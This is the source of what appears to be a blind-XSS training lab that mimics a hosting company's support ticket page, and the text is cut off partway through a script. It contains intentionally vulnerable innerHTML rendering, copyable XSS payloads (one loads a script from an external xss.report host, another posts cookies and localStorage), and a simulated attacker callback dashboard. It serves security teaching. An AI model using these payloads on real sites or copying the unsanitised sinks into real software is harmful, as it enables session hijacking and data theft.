.aln-input:focus{border-color:#4f46e5;box-shadow:0 0 0 3px rgba(79,70,229,.12);}
.aln-input::placeholder{color:#9ca3af;}
.aln-btn{width:100%;background:#4f46e5;border:none;border-radius:6px;padding:11px;color:#fff;font-size:.9rem;font-weight:700;cursor:pointer;transition:background .2s;font-family:inherit;margin-top:4px;}
.aln-btn:hover{background:#4338ca;}
.aln-err{background:#fef2f2;border:1px solid #fca5a5;color:#991b1b;border-radius:6px;padding:9px 12px;font-size:.82rem;margin-bottom:14px;display:none;}
.aln-err.show{display:block;}
.aln-creds{margin:20px 24px;border:1px solid #e5e7eb;border-radius:6px;padding:14px 16px;background:#f9fafb;}
.aln-creds-title{font-size:.68rem;font-weight:800;letter-spacing:.8px;color:#6b7280;text-transform:uppercase;margin-bottom:10px;}
.aln-creds-row{display:flex;justify-content:space-between;align-items:center;}
.aln-creds-user{font-size:.85rem;color:#374151;}
.aln-creds-pass{font-size:.85rem;color:#4f46e5;font-weight:600;}
</style>
</head>
<body>

<!-- ── Topbar (hidden on submit view via CSS, shown on admin/ticket/callbacks) ── -->
<div class="topbar">
  <div class="topbar-logo">
    <div class="topbar-logo-icon">
      <svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
    </div>
    ZAP Support
  </div>
  <div class="topbar-nav">
    <a href="index.php?view=submit"><button class="nav-btn <?php echo $view==='submit'?'active':''; ?>">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-2px;margin-right:4px;"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
      Submit Ticket
    </button></a>
    <a href="index.php?view=admin"><button class="nav-btn <?php echo $view==='admin'?'active':''; ?>">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-2px;margin-right:4px;"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
      Admin Panel
    </button></a>
    <a href="index.php?view=callbacks"><button class="nav-btn <?php echo $view==='callbacks'?'active':''; ?>" style="color:#f85149;">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-2px;margin-right:4px;"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.22 1.18 2 2 0 012.22 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.91 7.91a16 16 0 006.18 6.18l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"></path></svg>
      XSS Callbacks
    </button></a>
    <a href="../index.php"><button class="nav-btn" style="margin-left:8px;">← Back to Labs</button></a>
    <?php if(!empty($_SESSION['lab64_admin'])): ?>
    <a href="index.php?view=admin_logout"><button class="nav-btn danger" style="margin-left:4px;">Logout</button></a>
    <?php endif; ?>
  </div>
</div>

<!-- ── XSS fired modal (admin side) ── -->
<div class="modal-overlay" id="xssModal">
  <div class="modal">
    <div class="modal-hdr">
      <div class="modal-hdr-icon">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
      </div>
      <div>
        <div class="modal-hdr-title">⚡ Blind XSS Fired — Callback Received!</div>
        <div class="modal-hdr-sub">Simulating xss.report notification · Admin browser data captured</div>
      </div>
      <button class="modal-close" onclick="document.getElementById('xssModal').classList.remove('show')">✕</button>
    </div>
    <div class="modal-body">
      <div class="info-box danger" style="margin-bottom:16px;">
        <strong>Admin's browser data has been exfiltrated.</strong><br>
        In a real attack, this payload (<code>&lt;script src=//xss.report/c/attacker&gt;&lt;/script&gt;</code>) would send all of the following to the attacker's callback server.
      </div>
      <div id="modalFields"></div>
      <div style="margin-top:14px;display:flex;gap:8px;">
        <button class="btn btn-ghost btn-sm" onclick="document.getElementById('xssModal').classList.remove('show')">Close</button>
        <a href="index.php?view=callbacks"><button class="btn btn-danger btn-sm">View Callback Log</button></a>
      </div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<?php if ($view === 'admin_login'): ?>
<script>document.body.classList.add('admin-login-page');</script>

<!-- ═══════════════════════════════════════════════════════════════
     ADMIN LOGIN — session-protected gate before admin panel
═══════════════════════════════════════════════════════════════ -->
<div class="aln-wrap">
  <div>
    <div class="aln-card">
      <div class="aln-header">
        <h2>Admin Portal</h2>
        <p>Restricted access for administrators only</p>
      </div>
      <form class="aln-body" method="POST" action="index.php?view=admin_login">
        <?php if($loginError): ?>
        <div class="aln-err show"><?php echo htmlspecialchars($loginError); ?></div>
        <?php endif; ?>
        <div class="aln-field">
          <label class="aln-label">Username</label>
          <input class="aln-input" type="text" name="username" value="admin" autocomplete="off" required>
        </div>
        <div class="aln-field">
          <label class="aln-label">Password</label>
          <input class="aln-input" type="password" name="password" placeholder="Your password" required>
        </div>
        <input type="hidden" name="lab64_login" value="1">
        <button class="aln-btn" type="submit">Admin Login</button>
      </form>
      <div class="aln-creds">
        <div class="aln-creds-title">Admin Credentials</div>
        <div class="aln-creds-row">
          <span class="aln-creds-user"><?php echo LAB64_ADMIN_USER; ?></span>
          <span class="aln-creds-pass"><?php echo LAB64_ADMIN_PASS; ?></span>
        </div>
      </div>
    </div>
    <div style="text-align:center;margin-top:14px;font-size:.75rem;color:#9ca3af;">
      <a href="index.php" style="color:#6b7280;text-decoration:underline;">← Back to ZAP-Hosting page</a>
    </div>
  </div>
</div>

<?php elseif ($view === 'submit'): ?>
<script>document.body.classList.add('zap-page');</script>

<!-- ═══════════════════════════════════════════════════════════════
     ZAP-HOSTING HOMEPAGE REPLICA — Blind XSS Lab (Lab 64)
═══════════════════════════════════════════════════════════════ -->

<!-- Lab context notice (top strip) -->
<div class="lab-notice">
  <strong>🔬 LAB 64 — Blind XSS</strong>
  <span class="lab-notice-sep">|</span>
  This is a replica of the <strong>ZAP-Hosting</strong> support page. Click <strong>Support</strong> in the nav to open the vulnerable ticket form.
  <span class="lab-notice-sep">|</span>
  <a href="index.php?view=admin">Admin Panel</a>
  <span class="lab-notice-sep">·</span>
  <a href="index.php?view=callbacks">XSS Callbacks</a>
  <span class="lab-notice-sep">·</span>
  <a href="index.php">← Back to Labs</a>
</div>

<!-- ZAP Navigation -->
<nav class="zap-nav">
  <div class="zap-nav-inner">
    <a class="zap-logo" href="#">
      <div class="zap-logo-box">
        <!-- ZAP lightning bolt logo -->
        <svg class="zap-logo-svg" viewBox="0 0 40 40"><polygon points="24,4 10,22 20,22 16,36 30,18 20,18" fill="#1c232e"/><polygon points="24,4 10,22 20,22 16,36 30,18 20,18" fill="none" stroke="#4caf50" stroke-width="1.5"/></svg>
      </div>
      <span class="zap-logo-name">ZAP<span>HOSTING</span></span>
    </a>
    <div class="zap-navlinks">
      <a class="zap-navlink" href="#">Gameserver <svg viewBox="0 0 10 6"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></a>
      <a class="zap-navlink" href="#">TeamSpeak <svg viewBox="0 0 10 6"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></a>
      <a class="zap-navlink" href="#">VPS <svg viewBox="0 0 10 6"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></a>
      <a class="zap-navlink" href="#">Dedicated server <svg viewBox="0 0 10 6"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></a>
      <a class="zap-navlink" href="#">FiveM <svg viewBox="0 0 10 6"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></a>
      <a class="zap-navlink" href="#">Web Hosting <svg viewBox="0 0 10 6"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></a>
      <a class="zap-navlink" href="#">Lifetime <svg viewBox="0 0 10 6"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></a>
    </div>
    <div class="zap-nav-search">
      <svg class="zap-nav-search-icon" viewBox="0 0 24 24"><path d="M21 21l-4.35-4.35M17 11A6 6 0 111 11a6 6 0 0116 0z" stroke="#6b7280" stroke-width="2" fill="none" stroke-linecap="round"/></svg>
      <input type="text" placeholder="Search…">
    </div>
    <div class="zap-nav-actions">
      <button class="zn-btn zn-login">Log in with email</button>
      <button class="zn-btn zn-signup">Sign up! ⚡</button>
      <button class="zn-social zn-discord" title="Discord"><svg viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg></button>
      <button class="zn-social zn-twitch" title="Twitch"><svg viewBox="0 0 24 24"><path d="M11.571 4.714h1.715v5.143H11.57zm4.715 0H18v5.143h-1.714zM6 0L1.714 4.286v15.428h5.143V24l4.286-4.286h3.428L22.286 12V0zm14.571 11.143l-3.428 3.428h-3.429l-3 3v-3H6.857V1.714h13.714z"/></svg></button>
      <button class="zn-social zn-google" title="Google"><svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg></button>
      <button class="zn-social zn-facebook" title="Facebook"><svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></button>
      <!-- Lab navigation -->
      <button class="zap-support-link" onclick="document.getElementById('zapTicket').classList.add('show')">Support ▼</button>
    </div>
  </div>
</nav>

<!-- ZAP Hero / Main body -->
<div class="zap-hero">
  <div class="zap-hero-inner">
    <!-- Left: text -->
    <div>
      <div class="zap-server-badge">SERVER INSTANT ONLINE · configure, pay, enjoy!</div>
      <h1 class="zap-hero-h1">Server hosting with the new<br><span>ZAP 2.5</span> — Unique, Elegant and Fast</h1>
      <p class="zap-hero-desc">How important is an intuitive, modern and mobile optimised web panel for managing your servers to you? It is just as important to us as fast, DDoS-protected and fail-safe game servers. You're just one button away from being thrilled. 🎉</p>
      <div class="zap-features">
        <div class="zap-feature"><div class="zap-feature-check"><svg viewBox="0 0 12 10"><polyline points="1,5 4,8 11,1" stroke="#4caf50" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>DDoS-protected servers across 15+ locations</div>
        <div class="zap-feature"><div class="zap-feature-check"><svg viewBox="0 0 12 10"><polyline points="1,5 4,8 11,1" stroke="#4caf50" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>Instant setup — server online in under 60 seconds</div>
        <div class="zap-feature"><div class="zap-feature-check"><svg viewBox="0 0 12 10"><polyline points="1,5 4,8 11,1" stroke="#4caf50" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>FiveM, Minecraft, ARK, Rust and 100+ game servers</div>
        <div class="zap-feature"><div class="zap-feature-check"><svg viewBox="0 0 12 10"><polyline points="1,5 4,8 11,1" stroke="#4caf50" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>24/7 support via ticket &amp; live chat</div>
      </div>
    </div>
    <!-- Right: register form -->
    <div class="zap-regform">
      <h3>Server hosting with the new ZAP 2.5</h3>
      <input class="zap-ri" type="text" placeholder="Username">
      <input class="zap-ri" type="email" placeholder="john.doe@example.com">
      <input class="zap-ri" type="password" placeholder="Password">
      <button class="zap-reg-btn">Register</button>
      <div class="zap-divider">or sign up with</div>
      <div class="zap-socials">
        <button class="zap-social-btn"><svg viewBox="0 0 24 24" fill="#5865f2"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028 14.09 14.09 0 001.226-1.994.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128c.126-.094.252-.192.372-.292a.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.1.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg> Discord</button>
        <button class="zap-social-btn"><svg viewBox="0 0 24 24" fill="#9146ff"><path d="M11.571 4.714h1.715v5.143H11.57zm4.715 0H18v5.143h-1.714zM6 0L1.714 4.286v15.428h5.143V24l4.286-4.286h3.428L22.286 12V0zm14.571 11.143l-3.428 3.428h-3.429l-3 3v-3H6.857V1.714h13.714z"/></svg> Twitch</button>
        <button class="zap-social-btn"><svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg> Google</button>
        <button class="zap-social-btn"><svg viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg> Facebook</button>
      </div>
      <div class="zap-login-link">Already registered? <a href="#">Log in</a></div>
    </div>
  </div>
</div>

<!-- Stats bar -->
<div class="zap-stats">
  <div class="zap-stats-inner">
    <div class="zap-stat"><div class="zap-stat-num">20247+</div><div class="zap-stat-label">Active servers</div></div>
    <div class="zap-stat"><div class="zap-stat-num">13283</div><div class="zap-stat-label">Active Lifetime Server</div></div>
    <div class="zap-stat"><div class="zap-stat-num">125</div><div class="zap-stat-label">Orders yesterday</div></div>
    <div class="zap-stat"><div class="zap-stat-num">25003 ♥</div><div class="zap-stat-label">for ZAP</div></div>
  </div>
</div>

<!-- Floating chat widgets (right side) -->
<div class="zap-float">
  <button class="zap-float-btn" title="Live Chat" onclick="document.getElementById('zapTicket').classList.add('show')">
    <svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
  </button>
  <button class="zap-float-btn" title="Support Ticket" onclick="document.getElementById('zapTicket').classList.add('show')">
    <svg viewBox="0 0 24 24"><path d="M9 12h6m-3-3v6M19 21H5a2 2 0 01-2-2V5a2 2 0 012-2h14a2 2 0 012 2v14a2 2 0 01-2 2z" stroke="#6b7280" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg>
  </button>
  <button class="zap-float-btn" title="FAQ">
    <svg viewBox="0 0 24 24"><path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10zm0-14v4m0 4h.01" stroke="#6b7280" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg>
  </button>
</div>

<!-- Education / Payloads section -->
<div class="zap-edu">
  <div class="zap-edu-inner">
    <div class="zap-edu-title">🔬 Lab 64 — Blind XSS via Support Ticket</div>
    <div class="zap-edu-sub">Click <strong style="color:#4caf50">Support ▼</strong> in the nav (or the floating chat icon) to open the ticket form. Submit a payload → then visit the <a href="index.php?view=admin" style="color:#4caf50">Admin Panel</a> to trigger the XSS.</div>
    <div class="zap-edu-grid">
      <div class="card">
        <div class="card-header" style="font-size:.82rem;">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
          What is Blind XSS?
        </div>
        <div class="card-body">
          <div class="steps">
            <div class="step"><div class="step-num">1</div><div class="step-text"><strong>Submit payload</strong> in Name/Subject/Message — you see nothing fire here (it's blind).</div></div>
            <div class="step"><div class="step-num">2</div><div class="step-text"><strong>Payload stored raw</strong> in DB without sanitisation.</div></div>
            <div class="step"><div class="step-num">3</div><div class="step-text"><strong>Admin opens ticket</strong> → <code>innerHTML</code> renders payload → XSS fires in admin's browser.</div></div>
            <div class="step"><div class="step-num">4</div><div class="step-text"><strong>Attacker gets callback</strong> with cookies, IP, DOM via xss.report.</div></div>
          </div>
        </div>
      </div>
      <div class="card">
        <div class="card-header" style="font-size:.82rem;">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>
          Try These Payloads
        </div>
        <div class="card-body">
          <div class="fh" style="margin-bottom:8px;">Click to copy → paste into the ticket form fields:</div>
          <div style="margin-bottom:5px;font-size:.7rem;font-weight:700;color:var(--text2);text-transform:uppercase;">Basic alert</div>
          <div class="payload-box" onclick="copyPayload(this)">&lt;img src=x onerror=alert(document.domain)&gt;</div>
          <div style="margin:9px 0 5px;font-size:.7rem;font-weight:700;color:var(--text2);text-transform:uppercase;">From the real report</div>
          <div class="payload-box" onclick="copyPayload(this)">direct';"&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;script/src=//xss.report/c/rix4uni&gt;&lt;/script&gt;</div>
          <div style="margin:9px 0 5px;font-size:.7rem;font-weight:700;color:var(--text2);text-transform:uppercase;">Data exfiltration</div>
          <div class="payload-box" onclick="copyPayload(this)">&lt;img src=x onerror="fetch('index.php?action=xss_callback',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ticket_id:0,uri:location.href,cookies:document.cookie,referrer:document.referrer,user_agent:navigator.userAgent,origin:location.origin,local_storage:JSON.stringify(localStorage),dom:document.documentElement.outerHTML.substring(0,500)})})">  &lt;/div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ── ZAP Support Ticket Modal (white popup — exact image 2 replica) ── -->
<div class="zt-overlay" id="zapTicket" onclick="if(event.target===this)this.classList.remove('show')">
  <div class="zt-modal">
    <div class="zt-header">
      <div class="zt-icon">
        <svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><polyline points="2,4 12,13 22,4" stroke="#9ca3af" stroke-width="1.5" fill="none"/></svg>
      </div>
      <div>
        <div class="zt-title">Create ticket via mail</div>
        <div class="zt-avg">average response time: <strong>14 Minute(s)</strong></div>
      </div>
    </div>
    <div class="zt-body">
      <div class="zt-row2">
        <div class="zt-field">
          <label class="zt-label">Your name (optional)</label>
          <!-- ⚠ VULNERABLE: stored raw, rendered via innerHTML in admin panel -->
          <input type="text" id="name" class="zt-input" placeholder="">
        </div>
        <div class="zt-field">
          <label class="zt-label">Your E-Mail</label>
          <input type="email" id="email" class="zt-input" placeholder="">
        </div>
      </div>
      <div class="zt-field">
        <label class="zt-label">Subject</label>
        <!-- ⚠ VULNERABLE: stored raw, rendered via innerHTML in admin panel -->
        <input type="text" id="subject" class="zt-input" placeholder="">
      </div>
      <div class="zt-field">
        <label class="zt-label">Your message</label>
        <!-- ⚠ VULNERABLE: stored raw, rendered via innerHTML in admin panel -->
        <textarea id="message" class="zt-input" rows="6" placeholder=""></textarea>
      </div>
      <!-- Fake reCAPTCHA (non-functional, for visual fidelity) -->
      <div class="zt-recaptcha">
        <div class="zt-rc-check" id="rcCheck" onclick="this.classList.toggle('checked')"></div>
        <div class="zt-rc-text">I'm not a robot</div>
        <div class="zt-rc-logo">
          <svg width="32" height="32" viewBox="0 0 64 64"><circle cx="32" cy="32" r="30" fill="#4285f4"/><path d="M32 12c-11 0-20 9-20 20s9 20 20 20 20-9 20-20-9-20-20-20zm0 36c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z" fill="#fff"/></svg>
          <strong>reCAPTCHA</strong>
          <span>Privacy - Terms</span>
        </div>
      </div>
    </div>
    <div class="zt-msg" id="ztMsg"></div>
    <div class="zt-footer">
      <button class="zt-abort" onclick="document.getElementById('zapTicket').classList.remove('show');document.getElementById('ztMsg').className='zt-msg';">Abort</button>
      <button class="zt-submit" id="ztSubmit" onclick="submitTicket()">Submit</button>
    </div>
  </div>
</div>

<?php elseif ($view === 'admin'): ?>
<!-- ═══════════════════════════════════════════════════════════════
     ADMIN PANEL — renders tickets via innerHTML (VULNERABLE)
═══════════════════════════════════════════════════════════════ -->
<div class="hero" style="padding:24px 24px 20px;">
  <div class="hero-inner">
    <div style="display:flex;align-items:center;gap:10px;">
      <h1 style="font-size:1.3rem;">Support Admin Panel</h1>
      <span class="badge badge-red">
        <span style="width:7px;height:7px;border-radius:50%;background:var(--red);display:inline-block;"></span>
        XSS Sink Active
      </span>
    </div>
    <p style="margin-top:4px;">Ticket name &amp; subject are rendered via <code style="background:rgba(0,0,0,.3);padding:1px 4px;border-radius:3px;font-size:.8rem;">innerHTML</code> — payloads fire here.</p>
  </div>
</div>

<div class="layout">
  <div class="info-box danger">
    <strong>⚠ Vulnerable rendering:</strong> Ticket <em>name</em> and <em>subject</em> below are injected via <code>innerHTML</code> without sanitisation. Any XSS payload stored in those fields will execute <strong>in this admin browser context</strong> — simulating the real ZAP-Hosting Blind XSS (HackerOne Blind XSS report).
  </div>

  <div class="card">
    <div class="card-header">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>
      All Support Tickets
      <span id="ticketCount" style="margin-left:auto;font-size:.75rem;color:var(--text2);font-weight:400;"></span>
    </div>
    <div id="ticketList"><div class="empty-state"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.103 0-2 .897-2 2v12c0 1.103.897 2 2 2h16c1.103 0-2-.897 2-2V6c0-1.103-.897-2-2-2zm0 2v.511l-8 6.223-8-6.222V6h16zM4 18V9.044l7.386 5.745a.994.994 0 001.228 0L20 9.044 20.002 18H4z"/></svg>Loading tickets…</div></div>
  </div>
</div>

<?php elseif ($view === 'ticket'): ?>
<!-- ═══════════════════════════════════════════════════════════════
     TICKET DETAIL — all three fields rendered via innerHTML
═══════════════════════════════════════════════════════════════ -->
<div class="hero" style="padding:24px 24px 20px;">
  <div class="hero-inner">
    <div style="display:flex;align-items:center;gap:10px;">
      <h1 style="font-size:1.3rem;" id="pageTitle">Ticket Detail</h1>
      <span class="badge badge-red">
        <span style="width:7px;height:7px;border-radius:50%;background:var(--red);display:inline-block;"></span>
        3× innerHTML Sinks
      </span>
    </div>
    <p style="margin-top:4px;">Name, Subject, and Message are all rendered raw — three separate XSS triggers.</p>
  </div>
</div>

<div class="layout">
  <a href="index.php?view=admin"><button class="back-btn">← Back to Admin Panel</button></a>

  <div class="info-box danger" style="margin-bottom:18px;">
    <strong>⚠ All three fields below render via <code>innerHTML</code>.</strong> This matches the real report: "Your name (optional)", "Subject", and "Your message" are all vulnerable. Each one is a separate XSS trigger — a submitted payload fires here when you view this ticket.
  </div>

  <div class="card" id="ticketDetail">
    <div class="card-header">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path></svg>
      Ticket Details
    </div>
    <div class="card-body" id="ticketDetailBody">
      <div class="empty-state">Loading…</div>
    </div>
  </div>
</div>

<?php elseif ($view === 'callbacks'): ?>
<!-- ═══════════════════════════════════════════════════════════════
     XSS CALLBACKS — attacker's xss.report dashboard
═══════════════════════════════════════════════════════════════ -->
<div class="hero" style="padding:24px 24px 20px;background:linear-gradient(135deg,#1a0a0a 0%,#1a0d0d 50%,#0d1117 100%);">
  <div class="hero-inner">
    <div style="display:flex;align-items:center;gap:10px;">
      <h1 style="font-size:1.3rem;background:linear-gradient(90deg,#f85149,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">XSS Callback Log</h1>
      <span class="badge badge-red">Attacker View</span>
    </div>
    <p style="margin-top:4px;">Simulates the <strong>xss.report</strong> dashboard — data captured from the admin's browser when the payload fires.</p>
  </div>
</div>

<div class="layout">
  <div class="info-box warn" style="margin-bottom:18px;">
    <strong>Attacker perspective:</strong> In a real Blind XSS attack, the attacker sets their payload to call back to <code>xss.report</code> (or their own server). When any admin views the ticket, their browser executes the script and sends cookies, IP, DOM, localStorage and more to the attacker. This panel simulates that callback log.
  </div>

  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
    <div class="section-hdr" style="margin-bottom:0;flex:1;">
      <h2>Received Callbacks</h2>
      <div class="section-hdr-line"></div>
      <span id="cbCount" style="font-size:.75rem;color:var(--text2);margin-left:8px;white-space:nowrap;"></span>
    </div>
    <button class="btn btn-danger btn-sm" style="margin-left:16px;" onclick="clearCallbacks()">Clear All</button>
  </div>
  <div id="callbackList"><div class="empty-state"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></svg>No callbacks yet.<br>Submit a ticket with a payload, then open it in the Admin Panel.</div></div>
</div>

<?php endif; ?>

<script>
// ── Helpers ──────────────────────────────────────────────────────────────────
function safe(s){return String(s??'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function ago(d){
    const s=Math.floor((Date.now()-new Date(d))/1000);
    if(s<60)return s+'s ago';if(s<3600)return Math.floor(s/60)+'m ago';
    if(s<86400)return Math.floor(s/3600)+'h ago';return Math.floor(s/86400)+'d ago';
}
function toast(msg,type){
    const t=document.getElementById('toast');
    t.textContent=msg;t.className='toast '+(type||'ok');t.classList.add('show');
    setTimeout(()=>t.classList.remove('show'),3200);
}
function copyPayload(el){
    const txt=el.textContent;
    navigator.clipboard.writeText(txt).then(()=>toast('Payload copied!','ok')).catch(()=>{});
}

// ── dangerousInnerHTML — re-executes <script> tags after innerHTML injection ────
// Browsers silently drop <script> tags set via innerHTML; this function reattaches
// them as real DOM script elements so src= and inline scripts actually run.
